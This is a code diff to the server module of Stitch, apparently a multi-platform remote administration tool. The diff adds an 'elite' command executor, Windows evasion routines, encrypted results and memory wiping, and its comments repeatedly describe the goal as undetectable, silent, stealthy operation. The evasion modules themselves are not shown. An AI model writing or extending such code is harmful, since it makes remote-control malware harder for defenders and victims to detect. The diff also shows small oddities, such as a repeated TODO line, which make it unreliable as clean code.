@@ -1,12 +1,24 @@
-import os
 #!/usr/bin/env python
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+import os
+import sys
 import configparser
 from . import stitch_winshell
 from . import stitch_osxshell
 from . import stitch_lnxshell
+
+# Import Elite Command Executor for advanced undetectable operations
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+try:
+    from Core.elite_executor import EliteCommandExecutor
+    from Core.advanced_evasion import apply_evasions
+    from Core.memory_protection import get_memory_protection
+    from Core.crypto_system import get_crypto
+    ELITE_AVAILABLE = True
+except ImportError:
+    ELITE_AVAILABLE = False
 # TODO: Replace wildcard import with specific imports
 # TODO: Replace wildcard import with specific imports
 # TODO: Replace wildcard import with specific imports
@@ -36,6 +48,36 @@ class stitch_server(cmd.Cmd):
         self.aes_lib = configparser.ConfigParser()
         self.aes_lib.read(st_aes_lib)
         self.prompt = "{} {} ".format(st_tag,path_name)
+        
+        # Initialize Elite Systems for undetectable operations
+        self.elite_executor = None
+        self.crypto = None
+        self.memory_protection = None
+        
+        if ELITE_AVAILABLE:
+            try:
+                # Initialize elite command executor
+                self.elite_executor = EliteCommandExecutor()
+                
+                # Initialize encryption system
+                self.crypto = get_crypto()
+                
+                # Initialize memory protection
+                self.memory_protection = get_memory_protection()
+                
+                # Apply evasion techniques on Windows
+                if sys.platform == 'win32':
+                    evasion_results = apply_evasions()
+                    # Silent operation - no prints for stealth
+                
+                # Success - using elite undetectable mode
+                self.elite_mode = True
+            except Exception:
+                # Fallback to standard mode silently
+                self.elite_mode = False
+        else:
+            self.elite_mode = False
+        
         display_banner()
 
     def ConfigSectionMap(self, section):
@@ -92,9 +134,55 @@ class stitch_server(cmd.Cmd):
             pass
             # st_print('[!] Could not find {} in your history.\n'.format(section))
 
+    def execute_elite_command(self, command, args=None):
+        """Execute command through elite undetectable system"""
+        if self.elite_mode and self.elite_executor:
+            try:
+                # Check if command exists in elite executor
+                available_commands = self.elite_executor.get_available_commands()
+                
+                if command in available_commands:
+                    # Execute through elite system (undetectable)
+                    result = self.elite_executor.execute(command, args)
+                    
+                    # Encrypt result if crypto available
+                    if self.crypto:
+                        try:
+                            encrypted = self.crypto.encrypt_command(result)
+                            # Store encrypted for transmission
+                            result['encrypted'] = encrypted
+                        except:
+                            pass
+                    
+                    # Clean sensitive data from memory
+                    if self.memory_protection and 'sensitive' in result:
+                        self.memory_protection.secure_wipe(result['sensitive'])
+                    
+                    return result
+            except Exception:
+                pass
+        
+        # Fallback to standard execution
+        return None
+    
     def default(self, line):
         st_log.info('Stitch cmd command: "{}"'.format(line))
-    # st_print(run_command(line))
+        
+        # Try elite execution first (undetectable)
+        if self.elite_mode:
+            parts = line.split()
+            if parts:
+                command = parts[0]
+                args = parts[1:] if len(parts) > 1 else None
+                
+                result = self.execute_elite_command(command, args)
+                if result and result.get('success'):
+                    # Display result (uncomment when ready)
+                    # st_print(result.get('output', ''))
+                    return
+        
+        # Fallback to standard execution
+        # st_print(run_command(line))
 
     def run_server(self):
         client_socket=None
